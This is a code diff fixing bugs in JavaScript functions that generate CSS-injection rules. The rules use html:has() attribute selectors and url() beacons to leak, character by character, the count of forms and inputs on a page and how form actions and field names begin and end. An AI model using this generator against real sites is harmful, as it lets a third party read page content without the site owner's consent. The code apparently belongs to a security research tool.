@@ -120,7 +120,7 @@ function escapeCSS(str) {
 
 function discoverForms() {
     let css = '';
-    for(let i=1;i<=MAX_FORMS;$i++) {
+    for(let i=1;i<=MAX_FORMS;i++) {
         css += 'html:has(form:nth-of-type('+i+')){--formCount: url(/?formCount='+i+');}';
     }
     for(let i=0;i<CHARS.length;i++) {
@@ -128,10 +128,10 @@ function discoverForms() {
             css += 'html:has(form[action^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--form'+j+'ActionBegins: url(/?form'+j+'ActionBegins='+encodeURIComponent(CHARS[i])+');}';
         }
         for(let j=1;j<=MAX_FORMS;j++) {
-            css += 'html:has(form[action$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--form'+j+'ActionEnds: url(/?form'+j+'ActionEnds='.encodeURIComponent(CHARS[i])+');}';
+            css += 'html:has(form[action$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--form'+j+'ActionEnds: url(/?form'+j+'ActionEnds='+encodeURIComponent(CHARS[i])+');}';
         }
     }
-    return $css;
+    return css;
 }
 
 function discoverTextareas() {
@@ -146,15 +146,15 @@ function discoverTextareas() {
     }
     for(let i=0;i<CHARS.length;i++) {
         for(let j=1;j<=MAX_ELEMENTS;j++) {
-            $css += 'html:has(textarea[name$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--textarea'+j+'NameEnds: url(/?input'+j+'NameEnds='+encodeURIComponent(CHARS[i])+');}';
+            css += 'html:has(textarea[name$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--textarea'+j+'NameEnds: url(/?input'+j+'NameEnds='+encodeURIComponent(CHARS[i])+');}';
         }
     }
-    return $css;
+    return css;
 }
 
 function discoverInputs() {
     let css = '';
-    for(let i=1;i<=MAX;i++) {
+    for(let i=1;i<=MAX_ELEMENTS;i++) {
         css += 'html:has(input:nth-of-type('+i+')){--inputCount: url(/?inputCount='+i+');}';
     }
     for(let i=0;i<CHARS.length;i++) {
